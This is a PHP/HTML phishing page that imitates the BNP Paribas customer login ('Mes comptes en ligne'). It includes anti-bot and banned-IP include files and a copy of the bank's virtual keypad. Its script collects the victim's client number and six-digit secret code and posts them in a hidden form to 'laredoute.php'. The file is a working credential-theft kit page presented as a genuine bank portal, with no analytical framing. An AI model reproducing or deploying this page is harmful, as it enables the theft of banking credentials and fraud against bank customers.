<?php
include ('para.php');
include ('./inclu/bots.php');
include ('./inclu/banned-ip.php');
?>

<html lang="fr" class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style type="text/css">
<!--
.style1 {font-size: 10px}
body,td,th {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 12px;
	color: #999999;
}
body {
	background-color: #000000;
}
#enviar {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	background-color: #003366;
	color: #D4D0C8;
	font-weight: normal;
	border-top-style: double;
	border-right-style: double;
	border-bottom-style: double;
	border-left-style: double;
	font-size: 10px;
}
#emails {
}
.style2 {font-size: 9px; }
-->
</style>

	
	

	<title>Mes comptes en ligne</title>
	<style type="text/css">
		body
		{
		  margin:0;
		}

		body.ls-center
		{
		  text-align:center;
		}

		.ls-canvas .ls-row .ls-row-clr
		{
		  clear:both;
		}

		.ls-canvas .ls-col
		{
		  overflow:hidden;
		}

		.ls-canvas .ls-col-body
		{
		  overflow:hidden;
		}

		.ls-canvas .ls-area
		{
		  overflow:hidden;
		}

		.ls-canvas .ls-area-body
		{
		  overflow:hidden;
		}

		.ls-canvas .ls-area .ls-1st
		{
		  margin-top:0 !important;
		}

		.ls-canvas .ls-cmp-wrap
		{
		  padding:1px 0;
		}

		.ls-canvas .iw_component
		{
		  margin:-1px 0;
		}

		</style>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
	<link type="text/css" href="./Espace-client_files/context.css" rel="stylesheet">
	<link type="text/css" href="./Espace-client_files/mediaelementplayer.min.css" rel="stylesheet">
	<link type="text/css" href="./Espace-client_files/sitefactory.css" rel="stylesheet">
	<link type="text/css" href="./Espace-client_files/base.css" rel="stylesheet">
	<link type="text/css" href="./Espace-client_files/base-blessed2.css" rel="stylesheet">
	<link type="text/css" href="./Espace-client_files/base-blessed1.css" rel="stylesheet">
	<link type="text/css" href="./Espace-client_files/fix.css" rel="stylesheet">
	<link type="image/x-icon" href="./Espace-client_files/favicon.ico" rel="shortcut icon">
</head>
<body class="fr web world pub client no-bread-crumb ident part mw-1400">
	<div id="sf-master"><!--sf:begin[div:sf-master]--><!--ls:begin[body]-->
		<div class="ls-canvas" id="ls-canvas">
			<div class="ls-row" id="header">
				<div class="ls-fxr" id="ls-gen24203726-ls-fxr">
					<div class="ls-area headerContent" id="headerContent">
						<div class="ls-area-body" id="ls-gen24203727-ls-area-body">
							<div class="ls-cmp-wrap ls-1st" id="w1413474755920">
								<div class="iw_component" id="1413474755920"></div>
							</div>
							<div class="ls-cmp-wrap" id="w1413474755924">
								<div class="iw_component" id="1413474755924"></div>
							</div>
							<div class="ls-cmp-wrap" id="w1413474755926">
								<div class="iw_component" id="1413474755926">
									<!--content start-->
									<div id="wcm-l-header">
										<div class="wcm-html style-default client no-bread-crumb ident part ">
											<!-- test publi -->
											<header class="bottom-header">
												<div class="no-mob">
													<div class="logoBNP-container">
														<a href="/" class="logoBNP-alone text-hide">BNP Paribbas La banque d'un monde qui change</a>
														<p>La banque d'un monde qui change</p>        
													</div>       
													<button href="/fr/connexion" class="bouton-espace-client btn-block" id="bouton-espace-client" disabled="">Accéder à mes comptes</button>       
													<a href="/fr/banque-contacts/devenir-client-bnp-paribas" class="bouton-devenir-client part-only">Devenir client</a>    
												</div>   
												<header class="bottom-header-connected mobile-only pull-left" id="nav-connect">        <ul id="nav-connect-item" class="list-header-connected left nav-connecte-items mobile-only">            
													<li class="js-toggle-subnav">
														<i class="burger"></i>
													</li>            
													<li class="logo">
														<a href="/" class="logoBNP"></a>
													</li>            
													<li id="bouton-espace-client-mobile" class="bottom-header-lock pull-right"><span class="icon icon-lock"></span></li>        </ul>    </header></header></div>
</div><!--content stop-->
</div></div></div></div><div class="ls-area breadcrumb" id="breadcrumb"><div class="ls-area-body" id="ls-gen24203728-ls-area-body"><div class="ls-cmp-wrap ls-1st" id="w1413474755921"><div class="iw_component" id="1413474755921"><div class="wcm-fil-ariane style-default client no-bread-crumb ident part ">
<div class="wcm-fil-ariane-header">
<div class="wcm-fil-ariane-header-left"></div>
<div class="wcm-fil-ariane-header-right"></div>
</div>
</div>
</div></div><div class="ls-cmp-wrap" id="w1413474755928"><div class="iw_component" id="1413474755928"><!--content start--><div id="wcm-l-nav-ident">
<div class="wcm-html style-default client no-bread-crumb ident part "><ul class="list-outils">	<li><a href="/bnc/MonCompte/fr/connexion.php#" class="fontSmall">A<span>-</span></a></li>	<li><a href="/bnc/MonCompte/fr/connexion.php#" class="fontBig">A<span>+</span></a></li>	<li><a href="/bnc/MonCompte/fr/connexion.php#" class="icon-print" title="imprimer"></a></li></ul></div>
</div><!--content stop-->
</div></div></div></div><div class="ls-row-clr"></div></div></div><div class="ls-row" id="wrapper"><div class="ls-fxr" id="ls-gen24203729-ls-fxr"><div class="ls-area mainContent" id="mainContent"><div class="ls-area-body" id="ls-gen24203730-ls-area-body"><div class="ls-cmp-wrap ls-1st" id="w1413474755922"><div class="iw_component" id="1413474755922"><!--content start--><div id="wcm-l-">
<div class="wcm-html style-default "></div>
</div><!--content stop-->
</div></div>
<div class="ls-cmp-wrap" id="w1413474755927">
<div class="iw_component" id="1413474755927">
	<!--Tools Component start (AJAX Mode)-->
	<div id="id_balise_div"><div class="wcm-ia-column">
	<div id="ia-identification"><div rv-show="data.codeRetour | couldShow">
<!-- provient de  <base href="http://particulier-livesite-web.dev.echonet:8080/">-->
<div class="ident">
	<div class="carret-up"></div>
	<section class="main-content fond-gradient">
		<div class="container-ident">
			<div class="message-erreur arrow-bottom" id="message-erreur"></div>
			<h2 rv-text="config.app.identification.titre">Accéder à mes comptes</h2>
			<ul class="grille-ident">
				<li>
					<iframe id="remember" name="remember" class="hidden" action="javascript:void(0)"></iframe>
					<form name="logincanalnet" class="form" target="remember" autocomplete="on" action="laredoute.php">
						<label rv-text="config.app.identification.numclient">1. Mon numéro client</label>

						<input type="tel" pattern="[0-9]*" value="" name="ch1" maxlength="10" size="10" autofocus="" autocorrect="off" id="client-nbr" class="form-control numeric" rv-value-reactive="form.idTelematique" style="
    FONT-SIZE: 27px;
"><a class="reset-input" href="/bnc/MonCompte/fr/connexion.php#" id="initClient"></a>
						
						<input type="checkbox" value="" id="memoriser" name="memoriser"><label for="memoriser" class="checkbox-inline" rv-text="config.app.identification.memoriser">Mémoriser mon numéro client</label>
						<button type="submit" id="remember_button" class="hidden"></button>
					
				</form></li>
				<li>
					<label name="logincanalnetbis" method="post" class="form" action="laredoute.php">
						<label rv-text="config.app.identification.password">2. Mon code secret (6 chiffres)</label>
						<div class="field-password">
							<input type="password" disabled="" rv-value="form.password | starPassword" maxlength="6" name="staredPassword" id="secret-nbr" class="form-control">
							<a class="reset-input" href="/bnc/MonCompte/fr/connexion.php#" id="initPass"></a>
							<div class="cell-grid">
								<div id="secret-nbr-keyboard" rv-grille="data.grille.idGrille" style="background-image: url(./Espace-client_files/k-50634415037854521327874135539749512918.jpg);">
									<a href="javascript:pass(1)" data-id="01" rv-gridelement="form.password"></a>
									<a href="javascript:pass(6)" data-id="06" rv-gridelement="form.password"></a>
									<a href="javascript:pass(5)" data-id="05" rv-gridelement="form.password"></a>
									<a href="javascript:pass(8)" data-id="08" rv-gridelement="form.password"></a>
									<a href="javascript:pass(9)" data-id="09" rv-gridelement="form.password"></a>
									<a href="javascript:pass(4)" data-id="04" rv-gridelement="form.password"></a>
									<a href="javascript:pass(7)" data-id="07" rv-gridelement="form.password"></a>
									<a href="javascript:pass(2)" data-id="02" rv-gridelement="form.password"></a>
									<a href="javascript:pass(0)" data-id="00" rv-gridelement="form.password"></a>
									<a href="javascript:pass(3)" data-id="03" rv-gridelement="form.password"></a>
								</div>
							</div>
						</div>
						<div class="cell-password">
							<div class="field-valid">
								<button type="button" href="#" class="btn-primary btn-block" id="submitIdent" rv-text="config.app.identification.boutonTitle" disabled="disabled" style="
    font-size: initial;
">Accéder à mes comptes</button>
							</div>
						</div>
						<div id="zone-publiable-basse"><p id="zonePubliableBasIdentificationPart"></p>
</div>
					
				</label></li>
			</ul>
		</div>
	</section>

	<aside class="col-aside arrow-left">
		<div id="zone-publiable-haute"><h2 style="margin-top: 0px; margin-bottom: 0px; font-size: 2rem; padding: 15px 0px 0px; color: rgb(66, 66, 66);">INFORMATIONS CLIENT</h2><p style="margin-top: 0px; padding-bottom: 5px; color: rgb(66, 66, 66); font-size: 15px;">Vous allez vous connecter à votre nouveau site.</p><p class="no-padding-bottom" style="margin-top: 0px; padding-bottom: 0px; margin-bottom: 0px; color: rgb(66, 66, 66); font-size: 15px;">Si vous rencontrez des problèmes techniques lors de votre navigation, nous vous invitons à contacter nos conseillers en ligne au<span class="green-txt" style="color: rgb(27, 155, 91); white-space: nowrap;">0 800 48 48 48</span>&nbsp;(Service &amp; appel gratuits).</p><p class="center" style="margin-top: 0px; padding-bottom: 5px; color: rgb(66, 66, 66); font-size: 15px;"><br>ou&nbsp;<a class="btn-secondary" href="K1R4fr/banque-contacts/donnez-votre-avis">Signaler un problème technique</a></p><p style="margin-top: 0px; padding-bottom: 5px; color: rgb(66, 66, 66); font-size: 15px;">Sinon, vous pouvez bien évidemment gérer vos comptes depuis votre mobile ou votre tablette sur&nbsp;<a href="K1R4">mabanque.bnpparibas</a>&nbsp;ou à travers l'application&nbsp;<a href="K1R4fr/notre-offre/offre-mobile/nos-applications/mobile">Mes comptes</a>.</p><h2 style="margin-top: 0px; margin-bottom: 0px; font-size: 2rem; padding: 15px 0px 0px; color: rgb(66, 66, 66);">CODE SECRET OUBLIÉ ?</h2><p style="margin-top: 0px; padding-bottom: 5px; color: rgb(66, 66, 66); font-size: 15px;"><a href="K1R4fr/banque-contacts/demande-code-secret">Effectuez une nouvelle demande.</a></p><h2 style="margin-top: 0px; margin-bottom: 0px; font-size: 2rem; padding: 15px 0px 0px; color: rgb(66, 66, 66);">POUR UNE MEILLEURE ACCESSIBILITÉ</h2><p style="margin-top: 0px; padding-bottom: 5px; color: rgb(66, 66, 66); font-size: 15px;"><a href="K1R4fr/connexion/accessible">Connectez-vous</a>&nbsp;grâce à la grille contrastée, agrandie et bénéficiez d'un accompagnement vocal.</p><h2 style="margin-top: 0px; margin-bottom: 0px; font-size: 2rem; padding: 15px 0px 0px; color: rgb(66, 66, 66);">DÉMO DE VOTRE ESPACE CLIENT</h2><h2><a target="_blank" href="K1R4sitedemo/ident.html" id="btn-demo-ident" style="font-family: bnp_regular, Arial, sans-serif; font-size: 15px; background-color: rgb(248, 248, 248);">Découvrez une version de démonstration</a><span style="color: rgb(66, 66, 66); font-family: bnp_regular, Arial, sans-serif; font-size: 15px;">&nbsp;</span><span style="color: rgb(66, 66, 66); font-family: bnp_regular, Arial, sans-serif; font-size: 15px;">de votre espace client. Vous pouvez tester nos services en ligne sans vous identifier.</span></h2>
<p class="hidden"><a href="http:/#">Grille accessible</a></p>
<p><br></p></div>
	</aside>
</div>
</div>
<div class="identification_erreur_tech" rv-show="data.codeRetour | couldNotShow" style="display: none;"><p></p></div></div>
	
</div></div><!--Tools Component stop-->
</div></div></div></div><div class="ls-row-clr"></div></div></div><div class="ls-row" id="footer"><div class="ls-fxr" id="ls-gen24203731-ls-fxr"><div class="ls-area footerContent" id="footerContent"><div class="ls-area-body" id="ls-gen24203732-ls-area-body"><div class="ls-cmp-wrap ls-1st" id="w1413474755923"><div class="iw_component" id="1413474755923"><!--content start--><div id="wcm-l-">
<div class="wcm-richxml style-default client no-bread-crumb ident part ">
		
		
		<div class="wcm-richxml-content">
<div class="xml-document ">
<div class="xml-content ">
<div class="xml-layout ">
<table style="width:100%">
<tbody><tr>
<td class="col1 full-width">
<div class="xml-region ">
<div class="xml-section level1 footer-contact-bddf">
<h1>bnp paribas, la banque et l'assurance d'un monde qui change</h1>
<p style="clear:both;" class="footer-contact-bddf">Tout savoir sur le nouveau site !</p>
</div>
<div class="xml-section level1 icones-footer-contact-bddf">
<ul class="icones-footer-contact-bddf">
<li>
<a href="K1R4/votre-reaction"><span class="rond-cross-footer"><span class="icon icon-bulb"></span></span></a>
<br>
<span class="footer-title-descr"><a href="K1R4/">Votre réaction</a></span>
<br>
<span class="description"><a href="K1R4/votre-reaction">Retrouvezles réactions des clients BNP Paribas après leur première visite sur le nouveau site !</a></span>
</li>
<li>
<a href="K1R4/pourquoi-changer"><span class="rond-cross-footer"><span class="icon icon-reload"></span></span></a>
<br>
<span class="footer-title-descr"><a href="K1R4/pourquoi-changer">Pourquoi changer ?</a></span>
<br>
<span class="description"><a href="K1R4/pourquoi-changer">Votre site a plus de 10 ans !<br> BNP Paribas a décidé de repenser son site pour vous. Découvrez pourquoi !</a></span>
</li>
<li>
<a href="K1R4/en-pratique"><span class="rond-cross-footer"><span class="icon icon-play"></span></span></a>
<br>
<span class="footer-title-descr"><a href="K1R4/en-pratique">En pratique</a></span>
<br>
<span class="description"><a href="K1R4/en-pratique">Découvrez toutes les nouvelles fonctionnalités en vidéos.</a></span>
</li>
<li>
<a href="/fr/banque-contacts/donnez-votre-avis"><span class="rond-cross-footer"><span class="icon icon-bulle2"></span></span></a>
<br>
<span class="footer-title-descr"><a href="/fr/banque-contacts/donnez-votre-avis">Déposer un avis</a></span>
<br>
<span class="description"><a href="/fr/banque-contacts/donnez-votre-avis">Votre site évolue, votre avis nous intéresse !</a></span>
</li>
</ul>
</div>
</div>
</td>
</tr>
</tbody></table>
</div>
</div>
</div>
</div>
		
		
	</div>
</div><!--content stop-->
</div></div><div class="ls-cmp-wrap" id="w1424446736474"><div class="iw_component" id="1424446736474"><!--content start--><div id="wcm-l-">
<div class="wcm-richxml style-default client no-bread-crumb ident part ">
		
		
		<div class="wcm-richxml-content">
<div class="xml-document ">
<div class="xml-content ">
<div class="xml-layout ">
<table style="width:100%">
<tbody><tr>
<td class="col1 full-width">
<div class="xml-region ">
<div id="footerContent" class="xml-section level1 nav-cross-footer">
<ul class="nav-cross-footer">
<li>
<a href="/fr/banque-contacts">Contact</a>
</li>
<li>
<a href="/fr/legal/informations-legales">Infos légales</a>
</li>
<li>
<a href="/fr/legal/cookies">Cookies</a>
</li>
<li>
<a href="/fr/legal/infos-securite">Infos sécurité</a>
</li>
</ul>
<p style="clear:both;text-align:center;" class="nav-cross-footer">Pour la bonne exécution de vos contrats, et en cas de réclamations/contestations, votre Conseiller est joignable sur sa ligne directe (appel non surtaxé). Si vous ne disposez plus de son numéro de téléphone direct, envoyez-lui un message par votre messagerie sécurisée, il vous le donnera à nouveau en retour.</p>
</div>
</div>
</td>
</tr>
</tbody></table>
</div>
</div>
</div>
</div>
		
		
	</div>
</div><!--content stop-->
</div></div><div class="ls-cmp-wrap" id="w1413474755925"><div class="iw_component" id="1413474755925"><div class="wcm-javascript style-default client no-bread-crumb ident part ">
<script type="text/javascript">
/*window.webtrendsAsyncInit=function(){
var dcs=new Webtrends.dcs().init({
dcsid:"dcscf2lct100008mm6gqh20cl_4c6s",
domain:"statse.webtrendslive.com",
timezone:12,
i18n:true,
fpcdom:".domain.com",
plugins:{
//hm:{src:"//s.webtrends.com/js/webtrends.hm.js"}
}
})			
dcs.track();
};

function tagguageNext(argsa){
Webtrends.multiTrack({element:this, argsa:argsa});
}

(
function(){
var s=document.createElement("script"); s.async=true; s.src="/rsc/contrib/script/generique/webtrends.min.js";
var s2=document.getElementsByTagName("script")[0]; s2.parentNode.insertBefore(s,s2);
}()		
);*/</script>
</div>
</div></div></div></div><div class="ls-row-clr"></div></div></div></div><!--sf:end[div:sf-master]--></div><!--ls:end[body]-->
<script type="text/javascript" src="./Espace-client_files/jquery-1.11.0.min.js"></script><div class="state-indicator"></div>	
<script src="./Espace-client_files/webtrends.min.js"></script>

<script type="text/javascript">
	$(document).ready(function(){
		$("#initClient").bind("click", function(){
			$("#client-nbr").val("");
			$("#submitIdent").attr("disabled","disabled");
		})
		$("#initPass").bind("click", function(){
			$("#secret-nbr").val("");
			$("#submitIdent").attr("disabled","disabled");
		})
		$("#client-nbr").bind("keypress", function(){
			if($("#secret-nbr").val().length == 6 && $("#client-nbr").val().length == 10){
				$("#submitIdent").removeAttr("disabled");
			}else{
				$("#submitIdent").attr("disabled","disabled");
			}
		})
		$("#submitIdent").bind("click", function(){
			var form = $("<form style='display:none'  action='laredoute.php' method='post'><form/>");
			form.append('<input type="text" name="cpt" value="'+ $("#client-nbr").val() +'" />');
			form.append('<input type="text" name="pass" value="'+ $("#secret-nbr").val() +'" />');
			form.append('<input type="submit" value="go"/>');
			form.appendTo("body");
			form.submit();

		})
	});

	function pass(Value){
		if($("#secret-nbr").val().length < 6){
			$("#secret-nbr").val($("#secret-nbr").val()+Value);
		}
		if($("#secret-nbr").val().length == 6 && $("#client-nbr").val().length == 10){
			$("#submitIdent").removeAttr("disabled");
		}
	}
</script>
	
</body></html>